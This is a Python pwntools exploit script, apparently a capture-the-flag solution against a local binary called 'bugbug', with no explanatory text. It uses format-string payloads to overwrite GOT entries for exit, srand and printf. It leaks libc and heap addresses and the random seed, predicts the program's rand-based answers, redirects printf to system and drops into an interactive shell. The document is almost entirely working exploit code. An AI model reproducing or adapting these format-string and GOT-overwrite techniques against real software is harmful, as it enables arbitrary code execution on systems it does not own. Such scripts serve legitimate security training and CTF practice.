from pwn import *
import ctypes

p = process(["./bugbug"])
context.binary = "./bugbug"
binary = ELF("./bugbug")
#context.log_level = 'debug'

exit_got = 0x804a024
main = 0x804878c
bss = 0x0804a150
heap_offset = 0x1010

low = main & 0xffff
high = main >> 16

payload = ''
payload += "A" * 4 + p32(exit_got + 2)  + p32(0xdeadbeef) + p32(exit_got) + "%" + str(high - 0x10) + "c%18$hn%" + str(low - high)  + "c%20$hn"
length = len(payload)
payload += "B" * (100 - length - 4) + "C" * 4
p.recvuntil("you? ")
p.send(payload)
p.recvuntil("C" * 4)
seed = u32(p.recv(4))
p.recv(4)
libc = u32(p.recv(4))
libc_base = libc - 0x1b23dc
log.info("seed : " + hex(seed))
log.info("libc_base : " + hex(libc_base))

mlibc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
mlibc.srand(seed)
exp = ''
for i in xrange(6):
    exp += str(mlibc.rand() % 45 + 1) + " "
p.sendline(exp[:-1])

### stage 2 ###

log.info("Stage 2")
gets = libc_base + 0x5f3e0
system = libc_base + 0x3ada0
oneshot = libc_base + 0x3ac5c
low = system & 0xffff
high = system >> 16

payload = ''
payload += ";sh;" + p32(binary.got["srand"]) + p32(0xdeadbeef) + p32(binary.got["srand"] + 2) + "%" + str(low - 0x10) + "c%18$hn%" + str(high - low)  + "c%20$hn"
length = len(payload)
payload += "B" * (100 - length - 4) + "C" * 4
p.recvuntil("you? ")
p.send(payload)

p.recvuntil("C" * 4)
seed2 = u32(p.recv(4))
heap = u32(p.recv(4)) - heap_offset
libc = u32(p.recv(4))
libc_base = libc - 0x1b23dc
log.info("seed : " + hex(seed2))
log.info("libc_base : " + hex(libc_base))
log.info("heap : " + hex(heap))
mlibc.srand(seed2)
exp = ''
for i in xrange(6):
    exp += str(mlibc.rand() % 45 + 1) + " "
p.sendline(exp[:-1])

### stage 3 ###

log.info("Stage 3")
low = system & 0xffff
high = system >> 16

payload = ''
payload += "sh;a" + p32(binary.got["printf"]) + p32(0xdeadbeef) + p32(binary.got["printf"] + 2) + "%" + str(low - 0x10) + "c%18$hn%" + str(high - low)  + "c%20$hn"
length = len(payload)
payload += "B" * (100 - length - 4) + "C" * 4
p.recvuntil("you? ")
p.send(payload)

p.recvuntil("C" * 4)
exp = ''
for i in xrange(6):
    exp += str(mlibc.rand() % 45 + 1) + " "
p.sendline(exp[:-1])
p.sendline("/bin/sh\x00")

exp = ''
for i in xrange(6):
    exp += str(mlibc.rand() % 45 + 1) + " "
p.recvuntil("answer@_@")
print exp
p.sendline(exp)

p.interactive()
